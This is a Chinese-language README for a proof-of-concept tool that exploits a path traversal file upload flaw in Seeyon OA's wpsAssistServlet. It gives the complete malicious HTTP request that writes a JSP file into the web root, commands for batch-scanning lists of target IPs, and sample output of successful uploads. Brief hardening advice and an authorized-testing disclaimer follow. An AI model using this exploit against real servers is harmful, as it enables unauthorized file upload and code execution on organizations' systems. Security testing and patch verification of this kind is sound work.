# Seeyon WPS Assistant Servlet 漏洞检测工具

此工具用于检测致远OA Seeyon WPS Assistant Servlet的任意文件上传漏洞。

## 漏洞描述

致远OA的wpsAssistServlet存在路径穿越漏洞，攻击者可以通过构造特殊的文件上传请求，绕过路径限制，将恶意文件上传到Web服务器的任意位置。

**漏洞路径**: `/seeyon/wpsAssistServlet`

**漏洞参数**: 
- `flag=save`
- `realFileType=../../../../ApacheJetspeed/webapps/ROOT/Hello.jsp` (路径穿越)
- `fileId=2`

## 使用方法

### 1. 准备IP列表

在项目根目录创建 `ip.txt` 文件，每行一个目标IP或IP:PORT：

```
192.168.1.100
192.168.1.101:8080
10.0.0.10
example.com:80
```

### 2. 运行检测脚本

```bash
# 使用默认设置检测
cd poc
python3 main.py

# 指定IP文件
python3 main.py -f targets.txt

# 保存结果到文件
python3 main.py -o results.txt

# 查看帮助
python3 main.py --help
```

### 3. 高级版本

使用功能更完整的检测脚本：

```bash
# 使用高级版本
python3 seeyon_wps_exploit.py -f ../ip.txt

# 仅检查Seeyon服务，不进行漏洞利用
python3 seeyon_wps_exploit.py --check-only

# 设置超时时间
python3 seeyon_wps_exploit.py -t 15

# 保存结果
python3 seeyon_wps_exploit.py -o vulnerability_report.txt
```

## 输出示例

```
============================================================
Seeyon WPS Assistant Servlet 漏洞检测工具
警告: 此工具仅用于授权的安全测试!
============================================================
[*] 从 /path/to/ip.txt 加载了 4 个目标

[1/4] ========================================
[*] 测试目标: 192.168.1.100:80
[-] 连接超时: 192.168.1.100:80

[2/4] ========================================
[*] 测试目标: vulnerable-server.com:80
[*] 响应状态码: 200
[*] 响应长度: 1024 bytes
[+] 漏洞利用成功! 文件已上传: http://vulnerable-server.com/Hello.jsp
[+] 响应内容: HelloWorld

============================================================
检测结果汇总:
============================================================
[*] 总检测目标: 4
[*] 存在漏洞: 1

存在漏洞的目标:
  - vulnerable-server.com:80 -> http://vulnerable-server.com/Hello.jsp
```

## 文件结构

```
poc/
├── main.py                    # 简化版检测脚本
├── seeyon_wps_exploit.py     # 完整版检测脚本
└── README.md                 # 使用说明

ip.txt                        # 目标IP列表文件
```

## 技术细节

### 漏洞利用请求

```http
POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/Hello.jsp&fileId=2 HTTP/1.1
Host: target-host
Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b
Accept-Encoding: gzip

--59229605f98b8cf290a7b8908b34616b
Content-Disposition: form-data; name="upload"; filename="123.xls"
Content-Type: application/vnd.ms-excel

<% out.println("HelloWorld");%>
--59229605f98b8cf290a7b8908b34616b--
```

### 路径穿越说明

- `../../../../` - 向上跳转4级目录
- `ApacheJetspeed/webapps/ROOT/` - 目标路径
- `Hello.jsp` - 上传的JSP文件名

## 防护建议

1. **输入验证**: 对`realFileType`参数进行严格的路径验证，禁止包含`../`等路径穿越字符
2. **白名单限制**: 限制允许上传的文件类型和目标路径
3. **权限控制**: 确保Web应用运行在受限权限下
4. **版本更新**: 及时更新致远OA到最新版本
5. **WAF防护**: 部署Web应用防火墙检测路径穿越攻击

## 免责声明

**警告**: 此工具仅用于授权的安全测试！

- 请确保您有权限对目标系统进行安全测试
- 不得用于未经授权的渗透测试或恶意攻击
- 使用者需承担因使用此工具产生的所有法律责任
- 开发者不对因恶意使用此工具造成的任何损害负责

## 依赖模块

- Python 3.6+
- requests
- urllib3

安装依赖：
```bash
pip3 install requests urllib3
```